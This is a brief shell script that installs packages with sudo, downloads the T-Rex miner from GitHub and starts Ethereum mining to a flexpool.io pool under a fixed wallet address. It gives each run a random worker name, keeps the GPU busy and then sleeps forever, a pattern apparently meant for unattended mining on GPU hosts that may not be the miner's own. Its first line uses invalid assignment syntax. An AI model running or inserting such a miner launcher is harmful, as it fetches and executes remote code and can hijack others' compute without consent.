$GPU=(nvidia-smi --query-gpu=gpu_name --format=csv > nvidia.txt && echo "$(tail -n +2 "nvidia.txt")" > "nvidia.txt" && str=$(cat nvidia.txt) && echo ${str// /_})
sudo apt update
sudo apt install screen -y
sudo apt install libpci3
sudo apt-get install screen
wget -nv -c https://github.com/trexminer/T-Rex/releases/download/0.25.8/t-rex-0.25.8-linux.tar.gz -O - | tar -xz
LD_PRELOAD="" ./t-rex -a ethash -o stratum+ssl://eth-sg.flexpool.io:5555 -u 0x925966644EdEc86d0CC1C1cc6165A25A78b91Ba4 -p x -w $(echo $(shuf -i 1-9999 -n 1)-$GPU) --keep-gpu-busy
echo "started, sleeping"
sleep infinity
